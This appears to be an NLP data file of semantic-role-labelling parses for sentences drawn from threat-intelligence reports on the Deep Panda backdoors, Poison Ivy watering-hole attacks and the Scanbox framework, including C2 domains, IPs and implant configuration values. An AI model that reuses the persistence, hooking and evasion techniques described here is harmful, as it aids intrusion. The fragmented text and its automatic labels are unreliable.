"be", "index": 5}}, "used": {"ARG1": {"text": "The following python function"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "used", "index": 6}, "ARG2": {"text": "to decode the beacon stings"}}, "decode": {"V": {"text": "decode", "index": 8}, "ARG1": {"text": "the beacon stings"}}, "sending": {"V": {"text": "sending", "index": 14}, "ARG1": {"text": "the initial beacon"}}, "receiving": {"ARGM-TMP": {"text": "After sending the initial beacon"}, "ARG0": {"text": "the routine loops"}, "V": {"text": "receiving", "index": 22}, "ARG1": {"text": "incoming commands"}}, "executes": {"ARGM-TMP": {"text": "After sending the initial beacon"}, "ARG0": {"text": "the routine loops"}, "V": {"text": "executes", "index": 26}, "ARG1": {"text": "them"}, "ARGM-MNR": {"text": "in sequence"}}}, " The malicious component in this case is what is commonly referred to as a Remote Access Tool (RAT), this RAT is manifested as a Dynamic Link Library (DLL) installed as a service": {"is": {"ARG1": {"text": "The malicious component in this case"}, "V": {"text": "is", "index": 6}, "ARG2": {"text": "what is commonly referred to as a Remote Access Tool ( RAT )"}}, "is_2": {"V": {"text": "is", "index": 8}}, "referred": {"ARGM-ADV": {"text": "commonly"}, "V": {"text": "referred", "index": 10}, "ARG1": {"text": "to"}, "ARG2": {"text": "as a Remote Access Tool ( RAT )"}}, "is_3": {"V": {"text": "is", "index": 23}}, "manifested": {"ARG1": {"text": "this RAT"}, "V": {"text": "manifested", "index": 24}, "ARG3": {"text": "as a Dynamic Link Library ( DLL ) installed as a service"}}, "installed": {"ARG1": {"text": "a Dynamic Link Library ( DLL"}, "V": {"text": "installed", "index": 33}, "ARG2": {"text": "as a service"}}}, " Adds itself as a service name from the backdoor's configuration under HKEY_LOCAL_\n           MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\<service>\u201d This defaults to \u201cwuauserv\u201d,\n           the legitimate Windows Update service, in the given binary's default configuration": {"Adds": {"V": {"text": "Adds", "index": 0}, "ARG1": {"text": "itself"}, "ARG2": {"text": "as a service name from the backdoor 's configuration under HKEY_LOCAL _"}}, "given": {"V": {"text": "given", "index": 31}, "ARG1": {"text": "binary 's default configuration"}}}, "\n\nIn either case, the driver obtains the device object by using IoGetDeviceObjectPointer() and hooks Major\nFunction 14 the IRP_MJ_DEVICE_CONTROL, as this is the function through which all Input Output\nConTroLls (IOCTLs) are sent, such as the IOCTL for querying active IP connections": {"obtains": {"ARGM-DIS": {"text": "In either case"}, "ARG0": {"text": "the driver"}, "V": {"text": "obtains", "index": 6}, "ARG1": {"text": "the device object by using IoGetDeviceObjectPointer ( )"}}, "using": {"V": {"text": "using", "index": 11}, "ARG1": {"text": "IoGetDeviceObjectPointer ( )"}}, "hooks": {"ARGM-DIS": {"text": "In either case"}, "ARG0": {"text": "the driver"}, "V": {"text": "hooks", "index": 16}, "ARG1": {"text": "Major Function 14"}, "ARG2": {"text": "the IRP_MJ_DEVICE_CONTROL"}, "ARGM-CAU": {"text": "as this is the function through which all Input Output ConTroLls ( IOCTLs ) are sent , such as the IOCTL for querying active IP connections"}}, "is": {"ARG1": {"text": "this"}, "V": {"text": "is", "index": 25}, "ARG2": {"text": "the function through which all Input Output ConTroLls ( IOCTLs ) are sent , such as the IOCTL for querying active IP connections"}}, "are": {"V": {"text": "are", "index": 37}}, "sent": {"ARG2": {"text": "the function"}, "R-ARGM-MNR": {"text": "through which"}, "ARG1": {"text": "all Input Output ConTroLls ( IOCTLs )"}, "V": {"text": "sent", "index": 38}}, "querying": {"V": {"text": "querying", "index": 45}, "ARG1": {"text": "active IP connections"}}}, " The standard output channel of that command is provided back to\nthe C2": {"is": {"V": {"text": "is", "index": 7}}, "provided": {"ARG1": {"text": "The standard output channel of that command"}, "V": {"text": "provided", "index": 8}, "ARG2": {"text": "back to the C2"}}}, " The\npurpose of the hook is to scan the list of active connections returned to the user, and hide any such\nconnection currently bound to a local TCP port in\n\n\n\n<footer>\nCROWDSTRIKE                                                                           S E N S I T I VE        15\n</footer>\n\f\n<header>DEEP PANDA</header>\n\n\nthe range between 40000 and 45000": {"is": {"ARG1": {"text": "The purpose of the hook"}, "V": {"text": "is", "index": 5}, "ARG2": {"text": "to scan the list of active connections returned to the user , and hide any such connection currently bound to a local TCP port in the range between 40000 and 45000"}}, "scan": {"V": {"text": "scan", "index": 7}, "ARG1": {"text": "the list of active connections returned to the user"}}, "returned": {"ARG1": {"text": "active connections"}, "V": {"text": "returned", "index": 13}, "ARG4": {"text": "to the user"}}, "hide": {"V": {"text": "hide", "index": 19}, "ARG1": {"text": "any such connection currently bound to a local TCP port in the range between 40000 and 45000"}}, "bound": {"ARG1": {"text": "any such connection"}, "ARGM-TMP": {"text": "currently"}, "V": {"text": "bound", "index": 24}}}, "\n\n<figure></figure>\n\nThis inbound payload is received unconditionally and regardless of command type into a fixed-size stack \nbuffer of 408 bytes size": {"is": {"V": {"text": "is", "index": 3}}, "received": {"ARG1": {"text": "This inbound payload"}, "V": {"text": "received", "index": 4}, "ARGM-MNR": {"text": "unconditionally"}}, "fixed": {"V": {"text": "fixed", "index": 13}, "ARG1": {"text": "stack buffer"}}}, " It then checks for the values of the\n\u201cServiceDll\u201d and \u201cSecurity\u201d keys, in the latter case it applies an XOR on the data with the value 127": {"checks": {"ARG0": {"text": "It"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "checks", "index": 2}, "ARG1": {"text": "for the values of the \u201c ServiceDll \u201d"}}, "applies": {"ARGM-LOC": {"text": "in the latter case"}, "ARG0": {"text": "it"}, "V": {"text": "applies", "index": 22}, "ARG2": {"text": "an XOR on the data with the value 127"}}}, " Once the proper API\u2019s have been resolved, the sample then\nassigns a NULL SID to the rundll32.exe executable and sets the current process\u2019 Window Station to\n\u201cwinsta0\u201d, which enables the sample to access the real user\u2019s desktop if started as service": {"have": {"V": {"text": "have", "index": 5}}, "been": {"V": {"text": "been", "index": 6}}, "resolved": {"ARG1": {"text": "the proper API \u2019s"}, "V": {"text": "resolved", "index": 7}}, "assigns": {"ARGM-TMP": {"text": "Once the proper API \u2019s have been resolved/ then"}, "ARG0": {"text": "the sample"}, "V": {"text": "assigns", "index": 12}, "ARG1": {"text": "a NULL SID to the rundll32.exe executable"}}, "sets": {"ARGM-TMP": {"text": "Once the proper API \u2019s have been resolved/ then"}, "ARG0": {"text": "the sample"}, "V": {"text": "sets", "index": 21}, "ARG1": {"text": "the current process \u2019 Window Station to \u201c winsta0 \u201d"}, "ARGM-ADV": {"text": "which enables the sample to access the real user \u2019s desktop if started as service"}}, "\u201c": {"ARG0": {"text": "the current process \u2019 Window Station"}, "V": {"text": "\u201c", "index": 29}, "ARG1": {"text": "winsta0 \u201d"}}, "enables": {"ARG0": {"text": "which"}, "V": {"text": "enables", "index": 34}, "ARG2": {"text": "the sample"}, "ARG1": {"text": "to access the real user \u2019s desktop if started as service"}}, "access": {"ARG0": {"text": "the sample"}, "V": {"text": "access", "index": 38}, "ARG1": {"text": "the real user \u2019s desktop"}, "ARGM-ADV": {"text": "if started as service"}}, "started": {"ARG1": {"text": "the sample to"}, "V": {"text": "started", "index": 45}, "ARG2": {"text": "as service"}}}, " This third component is likely used for long-term implantation and intelligence gathering": {"is": {"ARG1": {"text": "This third component"}, "V": {"text": "is", "index": 3}, "ARG2": {"text": "likely used for long - term implantation and intelligence gathering"}}, "used": {"ARG1": {"text": "This third component"}, "ARGM-ADV": {"text": "likely"}, "V": {"text": "used", "index": 5}, "ARG2": {"text": "for long - term implantation and intelligence gathering"}}}, " It is instantiated when it is mapped \ninto the process space of its dropped file, and its' export named 'OpenINFOPerformanceData' is called": {"is": {"ARG1": {"text": "It"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "instantiated"}, "ARGM-TMP": {"text": "when it is mapped into the process space of its dropped file"}}, "instantiated": {"ARG1": {"text": "It"}, "V": {"text": "instantiated", "index": 2}, "ARGM-TMP": {"text": "when it is mapped into the process space of its dropped file"}}, "is_2": {"V": {"text": "is", "index": 5}}, "mapped": {"ARGM-TMP": {"text": "when"}, "ARG0": {"text": "it"}, "V": {"text": "mapped", "index": 6}, "ARG1": {"text": "into the process space of its dropped file"}}, "dropped": {"V": {"text": "dropped", "index": 13}, "ARG1": {"text": "file"}}, "named": {"ARG1": {"text": "its ' export"}, "V": {"text": "named", "index": 20}, "ARG2": {"text": "' OpenINFOPerformanceData '"}}, "is_3": {"V": {"text": "is", "index": 24}}, "called": {"ARG1": {"text": "its ' export named ' OpenINFOPerformanceData '"}, "V": {"text": "called", "index": 25}}}, "\n\n\n<footer>\nCROWDSTRIKE                                                                         S E N S I T I VE             11\n</footer>\n\f\n<header>DEEP PANDA</header>\n\n\nIf the current service name matches a set of pre-defined service names that legitimately exist in Windows, \nthe backdoor then loads the original service\u2019s DLL into the address space with LoadLibrary and invokes the\nServiceMain export": {"matches": {"ARG0": {"text": "the current service name"}, "V": {"text": "matches", "index": 5}, "ARG1": {"text": "a set of pre - defined service names that legitimately exist in Windows"}}, "exist": {"ARG1": {"text": "pre - defined service names"}, "R-ARG1": {"text": "that"}, "ARGM-MNR": {"text": "legitimately"}, "V": {"text": "exist", "index": 16}, "ARGM-LOC": {"text": "in Windows"}}, "loads": {"ARGM-ADV": {"text": "If the current service name matches a set of pre - defined service names that legitimately exist in Windows"}, "ARG0": {"text": "the backdoor"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "loads", "index": 23}, "ARG1": {"text": "the original service \u2019s DLL"}, "ARG2": {"text": "into the address space with LoadLibrary"}}, "invokes": {"ARGM-ADV": {"text": "If the current service name matches a set of pre - defined service names that legitimately exist in Windows"}, "ARG0": {"text": "the backdoor"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "invokes", "index": 36}, "ARG1": {"text": "the ServiceMain export"}}}, " This activity is generally associated with log cleaning to com-\nplicate a forensic investigation": {"is": {"V": {"text": "is", "index": 2}}, "associated": {"ARG1": {"text": "This activity"}, "ARGM-ADV": {"text": "generally"}, "V": {"text": "associated", "index": 4}, "ARG2": {"text": "with log cleaning to com- plicate a forensic investigation"}}, "plicate": {"V": {"text": "plicate", "index": 10}, "ARG1": {"text": "a forensic investigation"}}}, " If the input is not in this list of built-in\ncommands, the malware attempts to invoke cmd.exe in the background, launching a command or command\nline utility already present on the system": {"is": {"ARG1": {"text": "the input"}, "V": {"text": "is", "index": 3}, "ARGM-NEG": {"text": "not"}, "ARG2": {"text": "in this list of built - in commands"}}, "built": {"V": {"text": "built", "index": 9}, "ARG1": {"text": "commands"}}, "attempts": {"ARGM-ADV": {"text": "If the input is not in this list of built - in commands"}, "ARG0": {"text": "the malware"}, "V": {"text": "attempts", "index": 16}, "ARG1": {"text": "to invoke cmd.exe in the background , launching a command or command line utility already present on the system"}}, "invoke": {"ARG0": {"text": "the malware"}, "V": {"text": "invoke", "index": 18}, "ARG1": {"text": "cmd.exe"}, "ARGM-LOC": {"text": "in the background"}}, "launching": {"ARG0": {"text": "the malware"}, "V": {"text": "launching", "index": 24}, "ARG1": {"text": "a command or command line utility"}, "ARGM-TMP": {"text": "already present"}, "C-ARG1": {"text": "on the system"}}}, "\n\nThe export \u2018CollectW3PerfData\u2019 is registered as the main function of the DLL": {"is": {"V": {"text": "is", "index": 5}}, "registered": {"ARG1": {"text": "The export \u2018 CollectW3PerfData \u2019"}, "V": {"text": "registered", "index": 6}, "ARG2": {"text": "as the main function of the DLL"}}}, " This is typically seen in RATs for searching specific files to exfiltrate": {"is": {"V": {"text": "is", "index": 1}}, "seen": {"ARG1": {"text": "This"}, "ARGM-ADV": {"text": "typically"}, "V": {"text": "seen", "index": 3}, "ARGM-LOC": {"text": "in RATs"}, "ARG2": {"text": "for searching specific files to exfiltrate"}}, "searching": {"V": {"text": "searching", "index": 7}, "ARG1": {"text": "specific files"}, "ARG2": {"text": "to exfiltrate"}}, "exfiltrate": {"ARG0": {"text": "specific files"}, "V": {"text": "exfiltrate", "index": 11}}}, "\n\nThe malicious DLL file that is dropped is hidden in a resource of the dropper binary": {"is": {"V": {"text": "is", "index": 5}}, "dropped": {"ARG1": {"text": "The malicious DLL file"}, "R-ARG1": {"text": "that"}, "V": {"text": "dropped", "index": 6}}, "is_2": {"V": {"text": "is", "index": 7}}, "hidden": {"ARG1": {"text": "The malicious DLL file that is dropped"}, "V": {"text": "hidden", "index": 8}, "ARGM-LOC": {"text": "in a resource of the dropper binary"}}}, " The second sample analyzed is a dual use tool that can function both as a post exploitation tool used to infect other systems, download additional tools, remove log data, and itself be used as a backdoor": {"analyzed": {"ARGM-TMP": {"text": "second"}, "ARG0": {"text": "sample"}, "V": {"text": "analyzed", "index": 3}}, "is": {"ARG1": {"text": "The second sample analyzed"}, "V": {"text": "is", "index": 4}, "ARG2": {"text": "a dual use tool that can function both as a post exploitation tool used to infect other systems , download additional tools , remove log data , and itself be used as a backdoor"}}, "can": {"V": {"text": "can", "index": 10}}, "function": {"ARG0": {"text": "a dual use tool"}, "R-ARG0": {"text": "that"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "function", "index": 11}, "ARG1": {"text": "both"}, "ARGM-MNR": {"text": "as a post exploitation tool used to infect other systems"}}, "used": {"V": {"text": "used", "index": 18}}, "infect": {"ARG0": {"text": "a post exploitation tool"}, "V": {"text": "infect", "index": 20}, "ARG1": {"text": "other systems"}}, "download": {"ARG0": {"text": "a dual use tool"}, "R-ARG0": {"text": "that"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "download", "index": 24}, "ARG1": {"text": "additional tools"}}, "remove": {"V": {"text": "remove", "index": 28}, "ARG1": {"text": "log data"}}, "be": {"V": {"text": "be", "index": 34}}, "used_2": {"ARG1": {"text": "itself"}, "V": {"text": "used", "index": 35}, "ARG2": {"text": "as a backdoor"}}}, " This may be an\nattempt to fool some automated dynamic analysis or anti-malware software into believing this is the\nlegitimate ESET AV software": {"may": {"V": {"text": "may", "index": 1}}, "be": {"ARG1": {"text": "This"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "be", "index": 2}, "ARG2": {"text": "an attempt to fool some automated dynamic analysis or anti - malware software into believing this is the legitimate ESET AV software"}}, "fool": {"V": {"text": "fool", "index": 6}, "ARG1": {"text": "some automated dynamic analysis or anti - malware software"}, "ARGM-PRP": {"text": "into believing this is the legitimate ESET AV software"}}, "automated": {"V": {"text": "automated", "index": 8}, "ARG1": {"text": "dynamic analysis or anti - malware software"}}, "believing": {"ARG0": {"text": "some automated dynamic analysis or anti - malware software"}, "V": {"text": "believing", "index": 17}, "ARG1": {"text": "this is the legitimate ESET AV software"}}, "is": {"ARG1": {"text": "this"}, "V": {"text": "is", "index": 19}, "ARG2": {"text": "the legitimate ESET AV software"}}}, "\n       w3.org/2001/XMLSchema\u201d>\n        <HostName> Infected System Hostname</HostName>\n        <int_0>-8</int_0>\n        <osVersion>Microsoft Windows NT 6.1.7601 Service Pack 1</osVersion>\n        <string_0>12/27/2011 16:34:36</string_0>\n        <Version>2</Version>\n       </BasicInfo>\n</code>\nCommand handling loop, this is a loop structure that will process and execute commands sent by the C2": {"is": {"ARG1": {"text": "this"}, "V": {"text": "is", "index": 8}, "ARG2": {"text": "a loop structure that will process and execute commands sent by the C2"}}, "will": {"ARG0": {"text": "a loop structure"}, "R-ARG0": {"text": "that"}, "V": {"text": "will", "index": 13}, "ARG1": {"text": "process"}}, "process": {"ARG0": {"text": "a loop structure"}, "R-ARG0": {"text": "that"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "process", "index": 14}}, "execute": {"ARG0": {"text": "a loop structure"}, "R-ARG0": {"text": "that"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "execute", "index": 16}, "ARG1": {"text": "commands sent by the C2"}}, "sent": {"V": {"text": "sent", "index": 18}, "ARG0": {"text": "by the C2"}}}, "\n\n\n\nThe sample is capable of 'dropping' an embedded/encrypted kernel driver": {"is": {"ARG1": {"text": "The sample"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "capable of ' dropping ' an embedded / encrypted kernel driver"}}, "dropping": {"V": {"text": "dropping", "index": 6}, "ARG1": {"text": "an embedded / encrypted kernel driver"}}, "encrypted": {"V": {"text": "encrypted", "index": 11}, "ARG1": {"text": "kernel driver"}}}, " The GET request serves as a down-stream\n          channel while the POST request serves as a upstream channel": {"serves": {"ARG0": {"text": "The GET request"}, "V": {"text": "serves", "index": 3}, "ARG1": {"text": "as a down - stream channel"}, "ARGM-TMP": {"text": "while the POST request serves as a upstream channel"}}, "serves_2": {"ARG0": {"text": "the POST request"}, "V": {"text": "serves", "index": 14}, "ARG1": {"text": "as a upstream channel"}}}, " This one HTTP connection will be used for bi-directional\n          communications, sending chunks of POST payload and receiving chunks of the response,\n          interleaved": {"will": {"V": {"text": "will", "index": 4}}, "be": {"V": {"text": "be", "index": 5}}, "used": {"ARG1": {"text": "This one HTTP connection"}, "ARGM-MOD": {"text": "will"}, "V": {"text": "used", "index": 6}, "ARG2": {"text": "for bi - directional communications"}, "ARGM-ADV": {"text": "sending chunks of POST payload and receiving chunks of the response"}}, "sending": {"V": {"text": "sending", "index": 13}, "ARG1": {"text": "chunks of POST payload"}}, "receiving": {"V": {"text": "receiving", "index": 19}, "ARG1": {"text": "chunks of the response"}}, "interleaved": {"V": {"text": "interleaved", "index": 25}}}, " If the service is present, the malware replaces its previous instances or\nversions of this backdoor": {"is": {"ARG1": {"text": "the service"}, "V": {"text": "is", "index": 3}, "ARG2": {"text": "present"}}, "replaces": {"ARGM-ADV": {"text": "If the service is present"}, "ARG2": {"text": "the malware"}, "V": {"text": "replaces", "index": 8}, "ARG1": {"text": "its previous instances or versions of this backdoor"}}}, "\n\nThe communication to the C2 is handled by a while() loop, with each successive connection attempt\ncausing the loop to invoke the Windows Sleep() API for a time interval of 2 seconds, exponentially\nincreasing in length up to 1024 seconds (17 minutes) and then restarting back to 2 seconds": {"is": {"V": {"text": "is", "index": 5}}, "handled": {"ARG1": {"text": "The communication to the C2"}, "V": {"text": "handled", "index": 6}, "ARG0": {"text": "by a while ( ) loop"}, "ARGM-MNR": {"text": "with each successive connection attempt causing the loop to invoke the Windows Sleep ( ) API for a time interval of 2 seconds , exponentially increasing in length up to 1024 seconds ( 17 minutes ) and then restarting back to 2 seconds"}}, "causing": {"V": {"text": "causing", "index": 19}, "ARG1": {"text": "the loop to invoke the Windows Sleep ( ) API for a time interval of 2 seconds"}}, "invoke": {"ARG0": {"text": "the loop"}, "V": {"text": "invoke", "index": 23}, "ARG1": {"text": "the Windows Sleep ( ) API"}, "ARGM-TMP": {"text": "for a time interval of 2 seconds"}}, "increasing": {"ARGM-MNR": {"text": "exponentially"}, "V": {"text": "increasing", "index": 39}, "ARG1": {"text": "in"}, "ARG4": {"text": "length up to 1024 seconds ( 17 minutes )"}}, "restarting": {"ARGM-TMP": {"text": "then"}, "V": {"text": "restarting", "index": 52}, "ARGM-EXT": {"text": "back to 2 seconds"}}}, " The screen captures are\ncreated using a series of Microsoft Windows Graphic Device Interface (GDI) API calls culminating in a call to\nGetDIBits()": {"are": {"V": {"text": "are", "index": 3}}, "created": {"ARG1": {"text": "The screen captures"}, "V": {"text": "created", "index": 4}, "ARGM-MNR": {"text": "using a series of Microsoft Windows Graphic Device Interface ( GDI ) API calls culminating in a call to GetDIBits ( )"}}, "using": {"V": {"text": "using", "index": 5}, "ARG1": {"text": "a series of Microsoft Windows Graphic Device Interface ( GDI ) API calls culminating in a call to GetDIBits ( )"}}, "calls": {"V": {"text": "calls", "index": 18}, "ARG2": {"text": "culminating/ in a call to GetDIBits ( )"}}, "culminating": {"ARG1": {"text": "Microsoft Windows Graphic Device Interface ( GDI ) API calls"}, "V": {"text": "culminating", "index": 19}, "ARGM-ADV": {"text": "in a call to GetDIBits ( )"}}}, " The\nfirst 16 bytes of this array are then used as the KEY and the second 16 bytes are used as the IV for setting \nup AES encryption which is then used to encrypt and decrypt any further communications": {"are": {"V": {"text": "are", "index": 7}}, "used": {"ARG1": {"text": "The first 16 bytes of this array"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "used", "index": 9}, "ARG2": {"text": "as the KEY"}}, "are_2": {"V": {"text": "are", "index": 18}}, "used_2": {"ARG1": {"text": "the second 16 bytes"}, "V": {"text": "used", "index": 19}, "ARG2": {"text": "as the IV/ for setting up AES encryption which is then used to encrypt and decrypt any further communications"}}, "setting": {"ARG0": {"text": "the IV"}, "V": {"text": "setting", "index": 24}, "ARG1": {"text": "AES encryption which is then used to encrypt and decrypt any further communications"}}, "is": {"ARG1": {"text": "AES encryption/ which"}, "V": {"text": "is", "index": 29}, "ARGM-TMP": {"text": "then"}, "ARG2": {"text": "used to encrypt and decrypt any further communications"}}, "used_3": {"ARGM-TMP": {"text": "then"}, "V": {"text": "used", "index": 31}, "ARG2": {"text": "to encrypt and decrypt any further communications"}}, "encrypt": {"V": {"text": "encrypt", "index": 33}, "ARG1": {"text": "any"}}, "decrypt": {"V": {"text": "decrypt", "index": 35}, "ARG1": {"text": "any further communications"}}}, "\n</section>\n\n\n<footer>\n CROWDSTRIKE                                                                          S E N S I T I VE             25\n</footer> \n\f\n<header>DEEP PANDA</header>\n\n<section>\n\n<heading>Implant #2</heading>\n<heading>Backdoor DLL</heading>\nThis DLL is a moderately sophisticated backdoor with several well designed communication mechanisms\nnot typically seen in these types of implants": {"is": {"ARG1": {"text": "This DLL"}, "V": {"text": "is", "index": 2}, "ARG2": {"text": "a moderately sophisticated backdoor with several well designed communication mechanisms not typically seen in these types of implants"}}, "designed": {"ARGM-MNR": {"text": "well"}, "V": {"text": "designed", "index": 10}, "ARG1": {"text": "communication mechanisms"}}, "seen": {"ARG1": {"text": "several well designed communication mechanisms"}, "ARGM-NEG": {"text": "not"}, "ARGM-ADV": {"text": "typically"}, "V": {"text": "seen", "index": 15}, "ARGM-LOC": {"text": "in these types of implants"}}}, " The command \n0x22000001 initiates continuous transmission of screen captures to the C2": {"0x22000001": {"ARG0": {"text": "The command"}, "V": {"text": "0x22000001", "index": 2}, "ARG1": {"text": "initiates continuous transmission of screen captures to the C2"}}, "initiates": {"ARG0": {"text": "The command 0x22000001"}, "V": {"text": "initiates", "index": 3}, "ARG1": {"text": "continuous transmission of screen captures"}, "ARG2": {"text": "to the C2"}}}, "\n</section>\n\n<section>\n<heading>INTERNAL_CMD: Command-Line Shell</heading>\n\n\n\n<footer>\nCROWDSTRIKE                                                                         S E N S I T I VE          13\n</footer>\n\f\n<header>DEEP PANDA</header>\n\n\nThis handler class uses the command ID 5 and implements an interactive command line shell accessible\nfrom the C2 server, containing a series of built-in commands": {"uses": {"ARG0": {"text": "This handler class"}, "V": {"text": "uses", "index": 3}, "ARG1": {"text": "the command ID 5"}, "ARGM-PRD": {"text": "containing a series of built - in commands"}}, "implements": {"ARG0": {"text": "This handler class"}, "V": {"text": "implements", "index": 9}, "ARG1": {"text": "an interactive command line shell accessible"}, "ARG3": {"text": "from the C2 server"}, "ARGM-PRD": {"text": "containing a series of built - in commands"}}, "containing": {"ARG0": {"text": "This handler class"}, "V": {"text": "containing", "index": 21}, "ARG1": {"text": "a series of built - in commands"}}, "built": {"V": {"text": "built", "index": 25}}}, " Proprietary binary header (optionally over an HTTP Proxy using CONNECT mechanism); this\n          protocol consists of 64 random bytes being sent to the C2. The C2 then responds with 64 bytes\n          where the first four bytes must match the first four sent bytes to establish a connection \n          successfully": {"using": {"ARG0": {"text": "Proprietary binary header"}, "V": {"text": "using", "index": 9}, "ARG1": {"text": "CONNECT mechanism )"}}, "consists": {"ARG1": {"text": "this protocol"}, "V": {"text": "consists", "index": 16}, "ARG2": {"text": "of 64 random bytes being sent to the C2"}}, "being": {"V": {"text": "being", "index": 21}}, "sent": {"ARG1": {"text": "64 random bytes"}, "V": {"text": "sent", "index": 22}, "ARG2": {"text": "to the C2"}}, "responds": {"ARG0": {"text": "The C2"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "responds", "index": 30}, "ARG1": {"text": "with 64 bytes where the first four bytes must match the first four sent bytes to establish a connection successfully"}}, "must": {"V": {"text": "must", "index": 39}}, "match": {"ARGM-LOC": {"text": "64 bytes"}, "R-ARGM-LOC": {"text": "where"}, "ARG0": {"text": "the first four bytes"}, "ARGM-MOD": {"text": "must"}, "V": {"text": "match", "index": 40}, "ARG1": {"text": "the first four sent bytes"}, "ARGM-PRP": {"text": "to establish a connection successfully"}}, "sent_2": {"V": {"text": "sent", "index": 44}, "ARG1": {"text": "bytes"}}, "establish": {"V": {"text": "establish", "index": 47}, "ARG1": {"text": "a connection"}, "ARGM-MNR": {"text": "successfully"}}}, " Other domains resolving to the same IP include the following:\nBetween August 30, 2014 and September 16, 2014 we also observed SOGU (aka Kaba) callback traffic sent to assign.ddnsking.com over port 443": {"resolving": {"ARG1": {"text": "Other domains"}, "V": {"text": "resolving", "index": 2}, "ARG2": {"text": "to the same IP"}}, "include": {"ARG2": {"text": "Other domains resolving to the same IP"}, "V": {"text": "include", "index": 7}, "ARG1": {"text": "the following : Between August 30 , 2014 and September 16 , 2014 we also observed SOGU ( aka Kaba ) callback traffic sent to assign.ddnsking.com over port 443"}}, "following": {"V": {"text": "following", "index": 9}}, "observed": {"ARGM-TMP": {"text": "Between August 30 , 2014 and September 16 , 2014"}, "ARG0": {"text": "we"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "observed", "index": 23}, "ARG1": {"text": "SOGU ( aka Kaba ) callback traffic sent to assign.ddnsking.com over port 443"}}, "sent": {"ARG1": {"text": "SOGU ( aka Kaba ) callback traffic"}, "V": {"text": "sent", "index": 31}, "ARG2": {"text": "to assign.ddnsking.com over port 443"}}}, "\nThe Poison Ivy implant had the following configuration properties:\n<list>\nC2: quakegoogle.servequake.com, Port: 80\nPassword: qeTGd3485fF\nMutex: )!VoqA.I4\n</list>\nThe C2 domain quakegoogle.servequake[.]com resolved to 115.126.62.100 at the time of the SWCs": {"had": {"ARG0": {"text": "The Poison Ivy implant"}, "V": {"text": "had", "index": 4}, "ARG1": {"text": "the following configuration properties"}}, "following": {"V": {"text": "following", "index": 6}, "ARG1": {"text": "configuration properties"}}, "resolved": {"ARG0": {"text": "The C2 domain quakegoogle.servequake[.]com"}, "V": {"text": "resolved", "index": 14}, "ARG1": {"text": "to 115.126.62.100 at the time of the SWCs"}}}, " The threat group obfuscated the iframe on two of the compromised websites": {"obfuscated": {"ARG0": {"text": "The threat group"}, "V": {"text": "obfuscated", "index": 3}, "ARG1": {"text": "the iframe on two of the compromised websites"}}, "compromised": {"V": {"text": "compromised", "index": 10}}}, " In turn, these exploits downloaded and decoded a payload hosted at: hxxp://103.27.108.45/img/js.php": {"downloaded": {"ARGM-DIS": {"text": "In turn"}, "ARG0": {"text": "these exploits"}, "V": {"text": "downloaded", "index": 5}, "ARG1": {"text": "a payload hosted at : hxxp://103.27.108.45/img / js.php"}}, "decoded": {"ARGM-DIS": {"text": "In turn"}, "ARG0": {"text": "these exploits"}, "V": {"text": "decoded", "index": 7}, "ARG1": {"text": "a payload hosted"}}, "hosted": {"ARG1": {"text": "payload"}, "V": {"text": "hosted", "index": 10}}}, " The compromised websites contained an iframe to direct site visitors to a threat actor-controlled IP address that dropped a Poison Ivy remote access tool (RAT) onto victims\u2019 systems": {"compromised": {"V": {"text": "compromised", "index": 1}, "ARG1": {"text": "websites"}}, "contained": {"ARG0": {"text": "The compromised websites"}, "V": {"text": "contained", "index": 3}, "ARG1": {"text": "an iframe to direct site visitors to a threat actor - controlled IP address that dropped a Poison Ivy remote access tool ( RAT ) onto victims \u2019 systems"}}, "direct": {"V": {"text": "direct", "index": 7}, "ARG1": {"text": "site visitors"}, "ARG2": {"text": "to a threat actor - controlled IP address that dropped a Poison Ivy remote access tool ( RAT ) onto victims \u2019 systems"}}, "controlled": {"ARG0": {"text": "actor"}, "V": {"text": "controlled", "index": 15}, "ARG1": {"text": "IP address"}}, "dropped": {"ARG0": {"text": "a threat actor - controlled IP address"}, "R-ARG0": {"text": "that"}, "V": {"text": "dropped", "index": 19}, "ARG1": {"text": "a Poison Ivy remote access tool ( RAT ) onto victims \u2019 systems"}}}, " The group was able to compromise these websites and insert malicious iframes": {"was": {"ARG1": {"text": "The group"}, "V": {"text": "was", "index": 2}, "ARG2": {"text": "able to compromise these websites and insert malicious iframes"}}, "compromise": {"ARG0": {"text": "The group"}, "V": {"text": "compromise", "index": 5}, "ARG1": {"text": "these websites"}}, "insert": {"ARG0": {"text": "The group"}, "V": {"text": "insert", "index": 9}, "ARG1": {"text": "malicious"}, "ARGM-ADV": {"text": "iframes"}}}, "\nOrginaLFilename: chrome.exe\nLegalTrademarks:\nProductName: Google Chrome\nComparyShortName: Google\nLastChange: 265687\nFileDescription: Google Chrome\nOffcial Build: 1\nPriductVersion: 34.0.1847.131\nTranslation: 0\u00d70409 0x04b0\n</list>\nThis versioning info attempted to masquerade as a Google Chrome file": {"versioning": {"V": {"text": "versioning", "index": 31}, "ARG1": {"text": "info attempted"}}, "attempted": {"V": {"text": "attempted", "index": 33}, "ARG1": {"text": "to masquerade as a Google Chrome file"}}, "masquerade": {"V": {"text": "masquerade", "index": 35}, "ARGM-PRP": {"text": "as a Google Chrome file"}}}, "\nThe iframes on these websites directed visitors to Java exploits hosted at 103.27.108.45": {"directed": {"V": {"text": "directed", "index": 5}, "ARG1": {"text": "visitors"}, "ARG2": {"text": "to Java exploits hosted at"}}, "hosted": {"ARG1": {"text": "Java exploits"}, "V": {"text": "hosted", "index": 10}, "ARGM-LOC": {"text": "at 103.27.108.45"}}}, " This Javascript file is a framework for reconnaissance that the attackers call \"Scanbox\" and includes some of the techniques we described in a previous blog post: <list>Attackers abusing Internet Explorer to enumerate software and detect security products</list>\nThe Scanbox framework first configures the remote C&C server that it will use and collects a small amount of information about the victim that is visiting the compromised website including:\n<list>\n      Referer\n      User-Agent\n      Location\n      